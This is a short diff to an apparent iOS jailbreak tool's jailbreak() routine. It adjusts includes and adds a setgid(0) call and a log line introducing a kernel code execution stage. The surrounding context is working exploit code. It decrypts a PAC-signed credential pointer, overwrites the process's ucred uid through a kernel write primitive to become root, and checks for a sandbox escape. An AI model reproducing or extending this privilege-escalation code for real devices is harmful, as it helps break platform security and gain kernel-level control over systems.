@@ -9,8 +9,9 @@
 #include <sys/sysctl.h>
 #include "../Misc/support.h"
 #include <UIKit/UIKit.h>
-#import <Foundation/Foundation.h>
-#import "ViewController.h"
+#include <Foundation/Foundation.h>
+#include <mach/mach.h>
+#include "ViewController.h"
 
 #define CPU_SUBTYPE_ARM64E              ((cpu_subtype_t) 2)
 
@@ -76,13 +77,10 @@ int jailbreak(void *init){
     printf("PAC decrypt: 0x%llx -> 0x%llx\n", ucred_pac, ucred);
     [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC-Decrypt: 0x%llx -> 0x%llx", ucred_pac, ucred]];
     uint32_t buffer[5] = {0, 0, 0, 1, 0};
-    
     write_20(ucred + off_ucred_cr_uid, (void*)buffer);
-
     uint32_t uid = getuid();
     printf("getuid() returns %u\n", uid);
     [apiController sendMessageToLog:@"========================= Stage 2 ========================="];
-
     [apiController sendMessageToLog:[NSString stringWithFormat:@"==> getuid() returns %u", uid]];
     [apiController sendMessageToLog:[NSString stringWithFormat:@"==> whoami: %s", uid == 0 ? "root" : "mobile"]];
     printf("whoami: %s\n", uid == 0 ? "root" : "mobile");
@@ -103,7 +101,13 @@ int jailbreak(void *init){
         [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Could not escape the Sandbox"]];
         return 1;
     }
+    setgid(0);
+    uint32_t gid = getgid();
+    printf("getgid() returns %u\n", gid);
     sleep(1);
+    printf("Starting Kernel code execution....\n");
+    [apiController sendMessageToLog:@"====================== Stage 4 (KCE) ======================"];
+    
     return 0;
 }
 
